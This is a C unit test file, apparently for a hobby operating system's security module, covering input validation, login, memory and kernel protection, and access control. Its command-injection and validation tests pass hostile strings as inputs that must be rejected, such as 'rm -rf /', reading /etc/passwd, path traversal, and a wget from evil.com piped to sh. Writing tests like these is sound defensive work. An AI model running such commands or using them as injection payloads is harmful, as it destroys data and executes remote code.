/* test_security.c - Security-focused test cases for the OS */

#include "../src/security.h"
#include "../src/kernel.h"
#include "../src/memory_management.h"
#include "unity.h"
#include <stdio.h>
#include <string.h>

/* Test data */
#define TEST_USERNAME "testuser"
#define TEST_PASSWORD "testpass123"
#define TEST_ADMIN_USERNAME "admin"
#define TEST_ADMIN_PASSWORD "admin123"

/* Test helper functions */
static void setup_security_tests(void);
static void cleanup_security_tests(void);
static void test_input_validation(void);
static void test_user_authentication(void);
static void test_memory_protection(void);
static void test_buffer_overflow_protection(void);
static void test_command_injection_prevention(void);
static void test_access_control(void);
static void test_security_logging(void);
static void test_kernel_protection(void);

/* Setup function */
void setUp(void) {
    setup_security_tests();
}

/* Teardown function */
void tearDown(void) {
    cleanup_security_tests();
}

/* Setup security tests */
static void setup_security_tests(void) {
    /* Initialize security subsystem */
    TEST_ASSERT_TRUE(security_init());
    TEST_ASSERT_TRUE(security_init_memory_protection());
    TEST_ASSERT_TRUE(security_init_kernel_protection());
}

/* Cleanup security tests */
static void cleanup_security_tests(void) {
    /* Logout any current user */
    user_t* current_user = security_get_current_user();
    if (current_user) {
        security_logout_user(current_user);
    }
}

/* Test input validation */
static void test_input_validation(void) {
    /* Test valid input */
    TEST_ASSERT_TRUE(security_validate_input("hello world", 20));
    TEST_ASSERT_TRUE(security_validate_input("test123", 10));
    TEST_ASSERT_TRUE(security_validate_input("Hello_World-123", 20));
    
    /* Test invalid input */
    TEST_ASSERT_FALSE(security_validate_input(NULL, 10));
    TEST_ASSERT_FALSE(security_validate_input("", 0));
    TEST_ASSERT_FALSE(security_validate_input("test\x01world", 20)); /* Non-printable character */
    TEST_ASSERT_FALSE(security_validate_input("test\x7Fworld", 20)); /* DEL character */
    TEST_ASSERT_FALSE(security_validate_input("verylonginputthatexceedsmaximumlength", 10));
    
    /* Test filename validation */
    TEST_ASSERT_TRUE(security_validate_filename("test.txt"));
    TEST_ASSERT_TRUE(security_validate_filename("my_file-123.dat"));
    TEST_ASSERT_FALSE(security_validate_filename("test.txt; rm -rf /")); /* Command injection */
    TEST_ASSERT_FALSE(security_validate_filename("test.txt|cat /etc/passwd")); /* Command injection */
    TEST_ASSERT_FALSE(security_validate_filename("../etc/passwd")); /* Path traversal */
    
    /* Test path validation */
    TEST_ASSERT_TRUE(security_validate_path("/home/user/file.txt"));
    TEST_ASSERT_TRUE(security_validate_path("./relative/path.txt"));
    TEST_ASSERT_FALSE(security_validate_path("/home/user/../../../etc/passwd")); /* Path traversal */
    
    /* Test command validation */
    TEST_ASSERT_TRUE(security_validate_command("help"));
    TEST_ASSERT_TRUE(security_validate_command("echo hello"));
    TEST_ASSERT_FALSE(security_validate_command("echo hello; rm -rf /")); /* Command injection */
    TEST_ASSERT_FALSE(security_validate_command("cat /etc/passwd")); /* Unauthorized access */
}

/* Test user authentication */
static void test_user_authentication(void) {
    /* Test default users exist */
    user_t* admin_user = security_get_current_user();
    TEST_ASSERT_NOT_NULL(admin_user); /* Should have default admin */
    
    /* Test authentication with valid credentials */
    TEST_ASSERT_TRUE(security_authenticate_user(TEST_ADMIN_USERNAME, TEST_ADMIN_PASSWORD));
    
    user_t* current_user = security_get_current_user();
    TEST_ASSERT_NOT_NULL(current_user);
    TEST_ASSERT_EQUAL_STRING(TEST_ADMIN_USERNAME, current_user->username);
    TEST_ASSERT_EQUAL(PRIVILEGE_ADMIN, current_user->privilege);
    TEST_ASSERT_TRUE(current_user->is_active);
    
    /* Test authentication with invalid credentials */
    TEST_ASSERT_FALSE(security_authenticate_user("invalid_user", "invalid_pass"));
    TEST_ASSERT_FALSE(security_authenticate_user(TEST_ADMIN_USERNAME, "wrong_password"));
    
    /* Test creating new user */
    TEST_ASSERT_TRUE(security_create_user(TEST_USERNAME, TEST_PASSWORD, PRIVILEGE_USER));
    
    /* Test authenticating new user */
    security_logout_user(current_user); /* Logout current user */
    TEST_ASSERT_TRUE(security_authenticate_user(TEST_USERNAME, TEST_PASSWORD));
    
    current_user = security_get_current_user();
    TEST_ASSERT_NOT_NULL(current_user);
    TEST_ASSERT_EQUAL_STRING(TEST_USERNAME, current_user->username);
    TEST_ASSERT_EQUAL(PRIVILEGE_USER, current_user->privilege);
    
    /* Test logout */
    TEST_ASSERT_TRUE(security_logout_user(current_user));
    TEST_ASSERT_NULL(security_get_current_user());
}

/* Test memory protection */
static void test_memory_protection(void) {
    /* Test memory allocation with authentication */
    TEST_ASSERT_TRUE(security_authenticate_user(TEST_USERNAME, TEST_PASSWORD));
    
    void* ptr = NULL;
    TEST_ASSERT_TRUE(security_allocate_secure_memory(&ptr, 4096, MEM_PROT_READ | MEM_PROT_WRITE));
    TEST_ASSERT_NOT_NULL(ptr);
    
    /* Test memory access validation */
    TEST_ASSERT_TRUE(security_check_memory_access(ptr, 100, MEM_PROT_READ));
    TEST_ASSERT_TRUE(security_check_memory_access(ptr, 100, MEM_PROT_WRITE));
    TEST_ASSERT_FALSE(security_check_memory_access(ptr, 100, MEM_PROT_EXECUTE)); /* No execute permission */
    
    /* Test invalid memory access */
    TEST_ASSERT_FALSE(security_check_memory_access(NULL, 100, MEM_PROT_READ));
    TEST_ASSERT_FALSE(security_check_memory_access(ptr, 0, MEM_PROT_READ));
    TEST_ASSERT_FALSE(security_check_memory_access(ptr, 10000, MEM_PROT_READ)); /* Out of bounds */
    
    /* Test memory without authentication */
    security_logout_user(security_get_current_user());
    void* ptr2 = allocate_memory(4096);
    TEST_ASSERT_NULL(ptr2); /* Should fail without authentication */
    
    /* Re-authenticate and test normal allocation */
    TEST_ASSERT_TRUE(security_authenticate_user(TEST_USERNAME, TEST_PASSWORD));
    ptr2 = allocate_memory(4096);
    TEST_ASSERT_NOT_NULL(ptr2);
    
    /* Test freeing memory */
    free_memory(ptr2);
    
    /* Test secure memory free */
    TEST_ASSERT_TRUE(security_free_secure_memory(ptr));
}

/* Test buffer overflow protection */
static void test_buffer_overflow_protection(void) {
    char buffer[32];
    char large_input[128];
    
    /* Fill large input with data */
    for (int i = 0; i < 127; i++) {
        large_input[i] = 'A' + (i % 26);
    }
    large_input[127] = '\0';
    
    /* Test safe string copy */
    size_t copied = security_safe_strcpy(buffer, large_input, sizeof(buffer));
    TEST_ASSERT_LESS_THAN(sizeof(buffer), copied);
    TEST_ASSERT_EQUAL_STRING_LEN(large_input, buffer, sizeof(buffer) - 1);
    
    /* Test safe string concatenate */
    char dest[32] = "Hello";
    char src[] = " World!";
    size_t result = security_safe_strcat(dest, src, sizeof(dest));
    TEST_ASSERT_EQUAL_STRING("Hello World!", dest);
    TEST_ASSERT_EQUAL(12, result);
    
    /* Test buffer bounds checking */
    char test_buffer[64];
    void* valid_ptr = &test_buffer[10];
    void* invalid_ptr = &test_buffer[100]; /* Out of bounds */
    
    TEST_ASSERT_TRUE(security_check_buffer_bounds(test_buffer, sizeof(test_buffer), valid_ptr));
    TEST_ASSERT_FALSE(security_check_buffer_bounds(test_buffer, sizeof(test_buffer), invalid_ptr));
    
    /* Test null pointer handling */
    TEST_ASSERT_FALSE(security_safe_strcpy(NULL, "test", 10));
    TEST_ASSERT_FALSE(security_safe_strcpy(buffer, NULL, sizeof(buffer)));
    TEST_ASSERT_FALSE(security_safe_strcpy(buffer, "test", 0));
}

/* Test command injection prevention */
static void test_command_injection_prevention(void) {
    char sanitized[64];
    
    /* Test command injection attempts */
    TEST_ASSERT_FALSE(security_validate_input("ls; rm -rf /", 50));
    TEST_ASSERT_FALSE(security_validate_input("cat /etc/passwd", 50));
    TEST_ASSERT_FALSE(security_validate_input("echo test && reboot", 50));
    TEST_ASSERT_FALSE(security_validate_input("wget http://evil.com/malware.sh | sh", 50));
    TEST_ASSERT_FALSE(security_validate_input("`rm -rf /`", 50));
    TEST_ASSERT_FALSE(security_validate_input("$(rm -rf /)", 50));
    
    /* Test valid commands */
    TEST_ASSERT_TRUE(security_validate_input("help", 50));
    TEST_ASSERT_TRUE(security_validate_input("echo hello world", 50));
    TEST_ASSERT_TRUE(security_validate_input("clear", 50));
    
    /* Test input sanitization */
    TEST_ASSERT_TRUE(security_sanitize_input(sanitized, "hello; world", sizeof(sanitized)));
    TEST_ASSERT_EQUAL_STRING("hello world", sanitized);
    
    TEST_ASSERT_TRUE(security_sanitize_input(sanitized, "test|pipe", sizeof(sanitized)));
    TEST_ASSERT_EQUAL_STRING("testpipe", sanitized);
    
    TEST_ASSERT_TRUE(security_sanitize_input(sanitized, "normal_text-123", sizeof(sanitized)));
    TEST_ASSERT_EQUAL_STRING("normal_text-123", sanitized);
}

/* Test access control */
static void test_access_control(void) {
    /* Create users with different privileges */
    TEST_ASSERT_TRUE(security_create_user("guest_user", "guest123", PRIVILEGE_GUEST));
    TEST_ASSERT_TRUE(security_create_user("normal_user", "user123", PRIVILEGE_USER));
    TEST_ASSERT_TRUE(security_create_user("admin_user", "admin123", PRIVILEGE_ADMIN));
    
    /* Test privilege checking */
    user_t guest_user = {"guest_user", {0}, PRIVILEGE_GUEST, true, 0};
    user_t normal_user = {"normal_user", {0}, PRIVILEGE_USER, true, 0};
    user_t admin_user = {"admin_user", {0}, PRIVILEGE_ADMIN, true, 0};
    
    TEST_ASSERT_TRUE(security_check_permission(&guest_user, PRIVILEGE_GUEST));
    TEST_ASSERT_FALSE(security_check_permission(&guest_user, PRIVILEGE_USER));
    TEST_ASSERT_FALSE(security_check_permission(&guest_user, PRIVILEGE_ADMIN));
    
    TEST_ASSERT_TRUE(security_check_permission(&normal_user, PRIVILEGE_GUEST));
    TEST_ASSERT_TRUE(security_check_permission(&normal_user, PRIVILEGE_USER));
    TEST_ASSERT_FALSE(security_check_permission(&normal_user, PRIVILEGE_ADMIN));
    
    TEST_ASSERT_TRUE(security_check_permission(&admin_user, PRIVILEGE_GUEST));
    TEST_ASSERT_TRUE(security_check_permission(&admin_user, PRIVILEGE_USER));
    TEST_ASSERT_TRUE(security_check_permission(&admin_user, PRIVILEGE_ADMIN));
    
    /* Test inactive user */
    user_t inactive_user = {"inactive_user", {0}, PRIVILEGE_USER, false, 0};
    TEST_ASSERT_FALSE(security_check_permission(&inactive_user, PRIVILEGE_GUEST));
    
    /* Test null user */
    TEST_ASSERT_FALSE(security_check_permission(NULL, PRIVILEGE_GUEST));
}

/* Test security logging */
static void test_security_logging(void) {
    security_state_t* state = security_get_state();
    uint32_t initial_events = state->security_events_logged;
    uint32_t initial_violations = state->security_violations_logged;
    
    /* Test normal event logging */
    security_log_event("TEST_EVENT", "Test security event", NULL);
    TEST_ASSERT_EQUAL(initial_events + 1, state->security_events_logged);
    
    /* Test violation logging */
    security_log_security_violation("TEST_VIOLATION", "Test security violation", NULL);
    TEST_ASSERT_EQUAL(initial_violations + 1, state->security_violations_logged);
    TEST_ASSERT_EQUAL(initial_events + 2, state->security_events_logged);
    
    /* Test with authenticated user */
    TEST_ASSERT_TRUE(security_authenticate_user(TEST_USERNAME, TEST_PASSWORD));
    user_t* current_user = security_get_current_user();
    
    security_log_event("USER_EVENT", "User-initiated event", current_user);
    TEST_ASSERT_EQUAL(initial_events + 3, state->security_events_logged);
    
    security_log_security_violation("USER_VIOLATION", "User security violation", current_user);
    TEST_ASSERT_EQUAL(initial_violations + 2, state->security_violations_logged);
    TEST_ASSERT_EQUAL(initial_events + 4, state->security_events_logged);
}

/* Test kernel protection */
static void test_kernel_protection(void) {
    /* Test kernel pointer validation */
    void* valid_kernel_ptr = (void*)0x100000; /* 1MB mark */
    void* invalid_kernel_ptr = (void*)0xFFFFF; /* Below 1MB */
    void* user_ptr = (void*)0x200000; /* User space */
    
    TEST_ASSERT_TRUE(security_validate_kernel_pointer(valid_kernel_ptr));
    TEST_ASSERT_FALSE(security_validate_kernel_pointer(invalid_kernel_ptr));
    TEST_ASSERT_FALSE(security_validate_kernel_pointer(user_ptr));
    TEST_ASSERT_FALSE(security_validate_kernel_pointer(NULL));
    
    /* Test kernel access checking */
    TEST_ASSERT_TRUE(security_authenticate_user("kernel_user", "kernel123", PRIVILEGE_KERNEL));
    TEST_ASSERT_TRUE(security_check_kernel_access());
    
    security_logout_user(security_get_current_user());
    TEST_ASSERT_FALSE(security_check_kernel_access());
    
    TEST_ASSERT_TRUE(security_authenticate_user(TEST_USERNAME, TEST_PASSWORD));
    TEST_ASSERT_FALSE(security_check_kernel_access()); /* Regular user cannot access kernel */
    
    /* Test critical sections */
    security_enter_critical_section();
    security_exit_critical_section();
}

/* Test utility functions */
static void test_utility_functions(void) {
    /* Test password hashing */
    uint32_t hash1 = security_hash_password("password123");
    uint32_t hash2 = security_hash_password("password123");
    uint32_t hash3 = security_hash_password("different");
    
    TEST_ASSERT_EQUAL(hash1, hash2); /* Same password should hash to same value */
    TEST_ASSERT_NOT_EQUAL(hash1, hash3); /* Different passwords should hash differently */
    
    /* Test constant time comparison */
    uint8_t data1[] = "test data";
    uint8_t data2[] = "test data";
    uint8_t data3[] = "different";
    
    TEST_ASSERT_TRUE(security_constant_time_compare(data1, data2, sizeof(data1)));
    TEST_ASSERT_FALSE(security_constant_time_compare(data1, data3, sizeof(data1)));
    TEST_ASSERT_FALSE(security_constant_time_compare(NULL, data2, sizeof(data1)));
    TEST_ASSERT_FALSE(security_constant_time_compare(data1, NULL, sizeof(data1)));
    
    /* Test secure memory zeroing */
    char sensitive_data[] = "sensitive information";
    security_zero_memory(sensitive_data, sizeof(sensitive_data));
    
    for (size_t i = 0; i < sizeof(sensitive_data); i++) {
        TEST_ASSERT_EQUAL(0, sensitive_data[i]);
    }
    
    /* Test printable string validation */
    TEST_ASSERT_TRUE(security_is_printable_string("Hello World!", 20));
    TEST_ASSERT_TRUE(security_is_printable_string("test123", 10));
    TEST_ASSERT_FALSE(security_is_printable_string("Hello\x01World", 20));
    TEST_ASSERT_FALSE(security_is_printable_string("Hello\x7FWorld", 20));
}

/* Test security status display */
static void test_security_status(void) {
    security_display_security_status();
    
    /* Should not crash and should update event count */
    security_state_t* state = security_get_state();
    TEST_ASSERT_GREATER_THAN(0, state->security_events_logged);
}

/* Main test runner */
int main(void) {
    UNITY_BEGIN();
    
    RUN_TEST(test_input_validation);
    RUN_TEST(test_user_authentication);
    RUN_TEST(test_memory_protection);
    RUN_TEST(test_buffer_overflow_protection);
    RUN_TEST(test_command_injection_prevention);
    RUN_TEST(test_access_control);
    RUN_TEST(test_security_logging);
    RUN_TEST(test_kernel_protection);
    RUN_TEST(test_utility_functions);
    RUN_TEST(test_security_status);
    
    return UNITY_END();
}